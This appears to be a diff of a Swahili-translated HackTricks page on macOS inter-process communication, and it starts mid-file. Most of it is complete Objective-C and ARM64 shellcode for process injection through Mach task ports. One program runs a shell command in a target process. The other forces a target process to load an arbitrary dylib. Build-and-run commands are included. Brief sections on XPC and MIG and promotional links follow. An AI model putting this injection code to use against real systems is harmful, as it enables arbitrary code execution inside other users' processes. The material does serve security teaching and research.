+char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";
 
-// Get access to the task port of the process we want to inject into kern\_return\_t kr = task\_for\_pid(mach\_task\_self(), pid, \&remoteTask); if (kr != KERN\_SUCCESS) { fprintf (stderr, "Unable to call task\_for\_pid on pid %d: %d. Cannot continue!\n",pid, kr); return (-1); } else{ printf("Gathered privileges over the task port of process: %d\n", pid); }
 
-// Allocate memory for the stack mach\_vm\_address\_t remoteStack64 = (vm\_address\_t) NULL; mach\_vm\_address\_t remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate(remoteTask, \&remoteStack64, STACK\_SIZE, VM\_FLAGS\_ANYWHERE);
+int inject(pid_t pid){
 
-if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach\_error\_string(kr)); return (-2); } else {
+task_t remoteTask;
 
-fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64); }
+// Get access to the task port of the process we want to inject into
+kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
+if (kr != KERN_SUCCESS) {
+fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
+return (-1);
+}
+else{
+printf("Gathered privileges over the task port of process: %d\n", pid);
+}
 
-// Allocate memory for the code remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate( remoteTask, \&remoteCode64, CODE\_SIZE, VM\_FLAGS\_ANYWHERE );
+// Allocate memory for the stack
+mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
 
-if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach\_error\_string(kr)); return (-2); }
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
+else
+{
 
-// Write the shellcode to the allocated memory kr = mach\_vm\_write(remoteTask, // Task port remoteCode64, // Virtual Address (Destination) (vm\_address\_t) injectedCode, // Source 0xa9); // Length of the source
+fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
+}
 
-if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach\_error\_string(kr)); return (-3); }
+// Allocate memory for the code
+remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
 
-// Set the permissions on the allocated code memory kr = vm\_protect(remoteTask, remoteCode64, 0x70, FALSE, VM\_PROT\_READ | VM\_PROT\_EXECUTE);
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
 
-if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach\_error\_string(kr)); return (-4); }
 
-// Set the permissions on the allocated stack memory kr = vm\_protect(remoteTask, remoteStack64, STACK\_SIZE, TRUE, VM\_PROT\_READ | VM\_PROT\_WRITE);
+// Write the shellcode to the allocated memory
+kr = mach_vm_write(remoteTask,                   // Task port
+remoteCode64,                 // Virtual Address (Destination)
+(vm_address_t) injectedCode,  // Source
+0xa9);                       // Length of the source
 
-if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach\_error\_string(kr)); return (-4); }
 
-// Create thread to run shellcode struct arm\_unified\_thread\_state remoteThreadState64; thread\_act\_t remoteThread;
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+return (-3);
+}
 
-memset(\&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
 
-remoteStack64 += (STACK\_SIZE / 2); // this is the real stack //remoteStack64 -= 8; // need alignment of 16
+// Set the permissions on the allocated code memory
+kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
 
-const char\* p = (const char\*) remoteCode64;
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
+return (-4);
+}
 
-remoteThreadState64.ash.flavor = ARM\_THREAD\_STATE64; remoteThreadState64.ash.count = ARM\_THREAD\_STATE64\_COUNT; remoteThreadState64.ts\_64.\_\_pc = (u\_int64\_t) remoteCode64; remoteThreadState64.ts\_64.\_\_sp = (u\_int64\_t) remoteStack64;
+// Set the permissions on the allocated stack memory
+kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
 
-printf ("Remote Stack 64 0x%llx, Remote code is %p\n", remoteStack64, p );
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
+return (-4);
+}
 
-kr = thread\_create\_running(remoteTask, ARM\_THREAD\_STATE64, // ARM\_THREAD\_STATE64, (thread\_state\_t) \&remoteThreadState64.ts\_64, ARM\_THREAD\_STATE64\_COUNT , \&remoteThread );
+// Create thread to run shellcode
+struct arm_unified_thread_state remoteThreadState64;
+thread_act_t         remoteThread;
 
-if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to create remote thread: error %s", mach\_error\_string (kr)); return (-3); }
+memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
 
-return (0); }
+remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+//remoteStack64 -= 8;  // need alignment of 16
 
-pid\_t pidForProcessName(NSString \*processName) { NSArray \*arguments = @\[@"pgrep", processName]; NSTask \*task = \[\[NSTask alloc] init]; \[task setLaunchPath:@"/usr/bin/env"]; \[task setArguments:arguments];
+const char* p = (const char*) remoteCode64;
 
-NSPipe \*pipe = \[NSPipe pipe]; \[task setStandardOutput:pipe];
+remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
 
-NSFileHandle \*file = \[pipe fileHandleForReading];
+printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
 
-\[task launch];
+kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
 
-NSData \*data = \[file readDataToEndOfFile]; NSString \*string = \[\[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+if (kr != KERN_SUCCESS) {
+fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
+return (-3);
+}
 
-return (pid\_t)\[string integerValue]; }
+return (0);
+}
 
-BOOL isStringNumeric(NSString _str) { NSCharacterSet_ nonNumbers = \[\[NSCharacterSet decimalDigitCharacterSet] invertedSet]; NSRange r = \[str rangeOfCharacterFromSet: nonNumbers]; return r.location == NSNotFound; }
+pid_t pidForProcessName(NSString *processName) {
+NSArray *arguments = @[@"pgrep", processName];
+NSTask *task = [[NSTask alloc] init];
+[task setLaunchPath:@"/usr/bin/env"];
+[task setArguments:arguments];
 
-int main(int argc, const char \* argv\[]) { @autoreleasepool { if (argc < 2) { NSLog(@"Usage: %s ", argv\[0]); return 1; }
+NSPipe *pipe = [NSPipe pipe];
+[task setStandardOutput:pipe];
 
-NSString \*arg = \[NSString stringWithUTF8String:argv\[1]]; pid\_t pid;
+NSFileHandle *file = [pipe fileHandleForReading];
 
-if (isStringNumeric(arg)) { pid = \[arg intValue]; } else { pid = pidForProcessName(arg); if (pid == 0) { NSLog(@"Error: Process named '%@' not found.", arg); return 1; } else{ printf("Found PID of process '%s': %d\n", \[arg UTF8String], pid); } }
+[task launch];
 
-inject(pid); }
+NSData *data = [file readDataToEndOfFile];
+NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
 
-return 0; }
+return (pid_t)[string integerValue];
+}
 
-````
+BOOL isStringNumeric(NSString *str) {
+NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
+NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
+return r.location == NSNotFound;
+}
+
+int main(int argc, const char * argv[]) {
+@autoreleasepool {
+if (argc < 2) {
+NSLog(@"Usage: %s <pid or process name>", argv[0]);
+return 1;
+}
+
+NSString *arg = [NSString stringWithUTF8String:argv[1]];
+pid_t pid;
+
+if (isStringNumeric(arg)) {
+pid = [arg intValue];
+} else {
+pid = pidForProcessName(arg);
+if (pid == 0) {
+NSLog(@"Error: Process named '%@' not found.", arg);
+return 1;
+}
+else{
+printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
+}
+}
+
+inject(pid);
+}
+
+return 0;
+}
+```
 </details>
 ```bash
 gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
 ./inject <pi or string>
-````
+```
+### Kuingiza Dylib katika thread kupitia Task port
 
-#### Kuingiza Dylib katika thread kupitia Task port
-
-Katika macOS **threads** inaweza kubadilishwa kupitia **Mach** au kutumia **posix `pthread` api**. Thread tuliyounda katika kuingiza ya awali, iliumbwa kutumia Mach api, hivyo **siyo inalingana na posix**.
+Katika macOS **threads** inaweza kudhibitiwa kupitia **Mach** au kutumia **posix `pthread` api**. Thread tuliyounda katika kuingiza ya awali, iliumbwa kutumia Mach api, hivyo **siyo inalingana na posix**.
 
 Ilikuwa inawezekana **kuingiza shellcode rahisi** ili kutekeleza amri kwa sababu **haikuwa inahitaji kufanya kazi na posix** apis inalingana na Mach tu. **Kuingizaji za ngumu zaidi** zingehitaji **thread** kuwa pia **inalingana na posix**.
 
-Hivyo basi, ili **kuboresha thread** ni vyema kuita **`pthread_create_from_mach_thread`** ambayo itaunda pthread halali. Kisha, pthread mpya hii inaweza **kuita dlopen** ili **kupakia dylib** kutoka kwenye mfumo, hivyo badala ya kuandika shellcode mpya kutekeleza hatua tofauti, ni vyema kupakia maktaba za desturi.
+Hivyo, ili **kuboresha thread** ni vyema kuita **`pthread_create_from_mach_thread`** ambayo ita **umba pthread halali**. Kisha, pthread mpya hii inaweza **kuita dlopen** ili **kupakia dylib** kutoka kwenye mfumo, hivyo badala ya kuandika shellcode mpya kutekeleza hatua tofauti ni vyema kupakia maktaba za desturi.
 
-Unaweza kupata **mfano wa dylibs** katika (kwa mfano ule unaotengeneza logi kisha unaweza kusikiliza):
+Unaweza kupata **mfano wa dylibs** katika (kwa mfano moja inayozalisha logi na kisha unaweza kusikiliza):
 
-#### Tathmini ya Usalama wa macOS na Kuongeza Mamlaka
+{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
+[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
+{% endcontent-ref %}
 
-**Usanifu wa macOS**
+<details>
 
-**IPC ya macOS (Mawasiliano kati ya Michakato)**
+<summary>dylib_injector.m</summary>
+```objectivec
+// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
+// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
+#include <dlfcn.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <mach/mach.h>
+#include <mach/error.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <sys/sysctl.h>
+#include <sys/mman.h>
 
-Katika mifumo ya uendeshaji ya macOS, mawasiliano kati ya michakato hufanyika kupitia njia mbalimbali za IPC kama vile Mach Ports, XPC, sockets, na Apple Events. Hizi ni njia muhimu za mawasiliano ambazo zinaweza kutumiwa na watumiaji wa vibaya kwa kusudi la kuvunja usalama wa mfumo. Kuelewa jinsi mifumo hii ya IPC inavyofanya kazi ni muhimu katika kubaini na kuzuia mashambulizi ya kuvunja usalama.
+#include <sys/stat.h>
+#include <pthread.h>
 
+
+#ifdef __arm64__
+//#include "mach/arm/thread_status.h"
+
+// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
+// And I say, bullshit.
+kern_return_t mach_vm_allocate
+(
+vm_map_t target,
+mach_vm_address_t *address,
+mach_vm_size_t size,
+int flags
+);
+
+kern_return_t mach_vm_write
+(
+vm_map_t target_task,
+mach_vm_address_t address,
+vm_offset_t data,
+mach_msg_type_number_t dataCnt
+);
+
+
+#else
+#include <mach/mach_vm.h>
+#endif
+
+
+#define STACK_SIZE 65536
+#define CODE_SIZE 128
+
+
+char injectedCode[] =
+
+// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
+
+// Call pthread_set_self
+
+"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
+"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
+"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
+"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
+"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
+"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
+"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
+"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
+"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
+"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
+"\x00\x00\x00\x14" // loop: b loop              ; loop forever
+
+// Call dlopen with the path to the library
+"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
+"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
+"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
+"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
+"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()
+
+// Call pthread_exit
+"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
+"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
+"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit
+
+"PTHRDCRT"  // <-
+"PTHRDEXT"  // <-
+"DLOPEN__"  // <-
+"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;
+
+
+
+
+int inject(pid_t pid, const char *lib) {
+
+task_t remoteTask;
+struct stat buf;
+
+// Check if the library exists
+int rc = stat (lib, &buf);
+
+if (rc != 0)
+{
+fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
+//return (-9);
+}
+
+// Get access to the task port of the process we want to inject into
+kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
+if (kr != KERN_SUCCESS) {
+fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
+return (-1);
+}
+else{
+printf("Gathered privileges over the task port of process: %d\n", pid);
+}
+
+// Allocate memory for the stack
+mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
+else
+{
+
+fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
+}
+
+// Allocate memory for the code
+remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
+
+
+// Patch shellcode
+
+int i = 0;
+char *possiblePatchLocation = (injectedCode );
+for (i = 0 ; i < 0x100; i++)
+{
+
+// Patching is crude, but works.
+//
+extern void *_pthread_set_self;
+possiblePatchLocation++;
+
+
+uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
+uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
+uint64_t addrOfDlopen = (uint64_t) dlopen;
+
+if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
+{
+memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
+printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
+}
+
+if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
+{
+memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
+printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
+}
+
+if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
+{
+printf ("DLOpen @%llx\n", addrOfDlopen);
+memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
+}
+
+if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
+{
+strcpy(possiblePatchLocation, lib );
+}
+}
+
+// Write the shellcode to the allocated memory
+kr = mach_vm_write(remoteTask,                   // Task port
+remoteCode64,                 // Virtual Address (Destination)
+(vm_address_t) injectedCode,  // Source
+0xa9);                       // Length of the source
+
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+return (-3);
+}
+
+
+// Set the permissions on the allocated code memory
+```sw
+kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
+return (-4);
+}
+
+// Set the permissions on the allocated stack memory
+kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
+return (-4);
+}
+
+
+// Create thread to run shellcode
+struct arm_unified_thread_state remoteThreadState64;
+thread_act_t         remoteThread;
+
+memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
+
+remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+//remoteStack64 -= 8;  // need alignment of 16
+
+const char* p = (const char*) remoteCode64;
+
+remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+
+printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
+
+kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+
+if (kr != KERN_SUCCESS) {
+fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
+return (-3);
+}
+
+return (0);
+}
+
+
+
+int main(int argc, const char * argv[])
+{
+if (argc < 3)
+{
+fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
+fprintf (stderr, "   _action_: path to a dylib on disk\n");
+exit(0);
+}
+
+pid_t pid = atoi(argv[1]);
+const char *action = argv[2];
+struct stat buf;
+
+int rc = stat (action, &buf);
+if (rc == 0) inject(pid,action);
+else
+{
+fprintf(stderr,"Dylib not found\n");
+}
+
+}
+```
+</details>
 ```bash
 gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 ./inject <pid-of-mysleep> </path/to/lib.dylib>
 ```
+### Kuteka Wimbi kupitia Bandari ya Kazi <a href="#hatua-1-kuteka-wimbi" id="hatua-1-kuteka-wimbi"></a>
 
-#### Kuteka Thread kupitia Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+Katika mbinu hii, wimbi la mchakato linatekwa:
 
-Katika mbinu hii, thread ya mchakato inatekwa:
+{% content-ref url="macos-thread-injection-via-task-port.md" %}
+[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
+{% endcontent-ref %}
 
-### XPC
+## XPC
 
-#### Taarifa Msingi
+### Taarifa Msingi
 
-XPC, ambayo inasimama kwa XNU (kernel inayotumiwa na macOS) Inter-Process Communication, ni mfumo wa **mawasiliano kati ya michakato** kwenye macOS na iOS. XPC hutoa njia ya kufanya **wito salama, asinkroni kati ya michakato tofauti** kwenye mfumo. Ni sehemu ya mfumo wa usalama wa Apple, kuruhusu **ujenzi wa programu zilizotenganishwa kwa mamlaka** ambapo kila **sehemu** inaendeshwa na **ruhusa inayohitajika tu** kufanya kazi yake, hivyo kupunguza uharibifu unaoweza kutokea kutokana na mchakato uliokumbwa na shida.
+XPC, ambayo inasimama kwa Mawasiliano ya Mchakato wa XNU (jopo la kimsingi linalotumiwa na macOS), ni mfumo wa **mawasiliano kati ya michakato** kwenye macOS na iOS. XPC hutoa njia ya kufanya **wito salama, usio na mpangilio kati ya michakato tofauti** kwenye mfumo. Ni sehemu ya mfumo wa usalama wa Apple, kuruhusu **ujenzi wa programu zilizotenganishwa kwa ruhusa** ambapo kila **sehemu** inaendeshwa na **ruhusa inayohitajika tu** kufanya kazi yake, hivyo kupunguza uharibifu unaoweza kutokea kutokana na mchakato uliokumbwa na shida.
 
 Kwa maelezo zaidi kuhusu jinsi hii **mawasiliano inavyofanya kazi** au jinsi inavyoweza kuwa **dhaifu**, angalia:
 
-### MIG - Mach Interface Generator
+{% content-ref url="macos-xpc/" %}
+[macos-xpc](macos-xpc/)
+{% endcontent-ref %}
 
-MIG ilianzishwa ili **kurahisisha mchakato wa uundaji wa nambari za Mach IPC**. Kimsingi **inazalisha nambari inayohitajika** kwa server na mteja kufanya mawasiliano kulingana na ufafanuzi uliopewa. Hata kama nambari iliyozalishwa ni mbaya, mwandishi wa programu atahitaji tu kuagiza na nambari yake itakuwa rahisi zaidi kuliko hapo awali.
+## MIG - Mjenzi wa Kiolesura cha Mach
+
+MIG ilianzishwa ili **kurahisisha mchakato wa uundaji wa nambari za Mach IPC**. Kimsingi **inazalisha nambari inayohitajika** kwa seva na mteja kuwasiliana na ufafanuzi uliopewa. Hata kama nambari iliyozalishwa ni mbaya, mwandishi wa programu atahitaji tu kuagiza hiyo na nambari yake itakuwa rahisi sana kuliko hapo awali.
 
 Kwa maelezo zaidi angalia:
 
-### Marejeo
+{% content-ref url="macos-mig-mach-interface-generator.md" %}
+[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
+{% endcontent-ref %}
+
+## Marejeo
 
 * [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
 * [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
 * [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
 * [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
 * [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
+
+<details>
+
+<summary><strong>Jifunze kuhusu kuteka AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+
+Njia nyingine za kusaidia HackTricks:
+
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za kuteka kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
